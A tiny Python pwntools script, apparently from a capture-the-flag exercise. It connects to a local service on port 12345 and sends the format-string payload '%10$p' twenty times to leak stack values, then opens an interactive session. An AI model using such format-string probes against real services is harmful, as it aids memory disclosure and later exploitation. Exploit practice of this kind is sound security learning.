from pwn import *
io = remote("127.0.0.1", 12345)

for i in range(20):
	print io.recvuntil(">> ")
	io.sendline("%10$p")

io.interactive()	